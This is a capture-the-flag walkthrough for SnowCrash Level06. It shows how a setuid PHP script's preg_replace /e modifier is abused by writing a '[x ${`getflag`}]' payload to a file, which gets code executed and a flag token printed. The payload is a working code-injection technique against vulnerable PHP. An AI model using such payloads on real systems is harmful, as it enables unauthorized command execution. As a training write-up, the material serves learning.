# 🧊 SnowCrash - Level06 Walkthrough

## Level: 06

**Objective:** Exploit a vulnerable PHP script to execute arbitrary code and retrieve the token for `flag06`.

### 🧩 Step-by-step Solution

**1. List the files in the home directory**

```bash
ls -l
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwsr-x---  1 flag06 level06  356 Mar  5  2015 level06.php
```

🔍 The `level06` binary is setuid and owned by `flag06`. It appears to use `level06.php` internally.

**2. Analyze the vulnerable PHP script**

```bash
#!/usr/bin/php
<?php
function y($m) {
    $m = preg_replace("/\./", " x ", $m);
    $m = preg_replace("/@/", " y", $m);
    return $m;
}

function x($y, $z) {
    $a = file_get_contents($y);
    $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
    $a = preg_replace("/\[/", "(", $a);
    $a = preg_replace("/\]/", ")", $a);
    return $a;
}

$r = x($argv[1], $argv[2]);
print $r;
?>
```

🔍 Security issue: The regex `preg_replace("/(\[x (.*)\])/e", ...)` uses the deprecated `e` modifier, which **evaluates the replacement string as PHP code**.

✅ This makes it vulnerable to code injection inside `[x ...]`.

**3. Craft the payload**

Write a file containing malicious code:

```bash
echo '[x ${`getflag`}]' > /tmp/exploit
```

**4. Run the binary with the payload**

```bash
./level06 /tmp/exploit
```
✅ Output:

```bash
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
```

🎯 The flag was successfully injected and executed via PHP’s vulnerable regex replacement!

**🔓 Successfully moved to level07!**